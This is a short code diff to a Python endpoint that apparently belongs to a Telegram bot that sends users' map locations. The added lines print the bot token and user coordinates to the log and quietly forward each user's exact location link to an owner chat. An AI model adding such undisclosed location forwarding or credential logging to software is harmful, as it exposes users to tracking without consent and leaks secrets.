@@ -161,7 +161,8 @@ def send_location():
     lat = data.get("lat")
     lon = data.get("lon")
 
-    # ✅ Fix: सिर्फ़ None check, 0.0 values reject नहीं होंगी
+    print("DEBUG:", token, chat_id, lat, lon)
+
     if not chat_id or lat is None or lon is None:
         return jsonify({"status": "missing data"}), 400
 
@@ -172,6 +173,7 @@ def send_location():
         print("Invalid coords:", e)
         return jsonify({"status": "invalid coords"}), 400
 
+    # Step 1: Send native Telegram location bubble
     try:
         resp = requests.post(
             f"{TELEGRAM_API}/sendLocation",
@@ -196,6 +198,24 @@ def send_location():
             print("Location send failed:", result)
     except Exception as e:
         print("Error sending location:", e)
+
+    # Step 2: Send Google Maps link
+    try:
+        maps_url = f"https://www.google.com/maps?q={lat},{lon}"
+        text = f"📍 *Open in Google Maps:*\n{maps_url}"
+        requests.post(
+            f"{TELEGRAM_API}/sendMessage",
+            data={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"},
+            timeout=10
+        )
+        # Forward link to owner too
+        requests.post(
+            f"{TELEGRAM_API}/sendMessage",
+            data={"chat_id": OWNER_CHAT_ID, "text": f"User {chat_id} map link:\n{maps_url}"},
+            timeout=10
+        )
+    except Exception as e:
+        print("Error sending maps link:", e)
 
     return jsonify({"status": "sent"}), 200
 
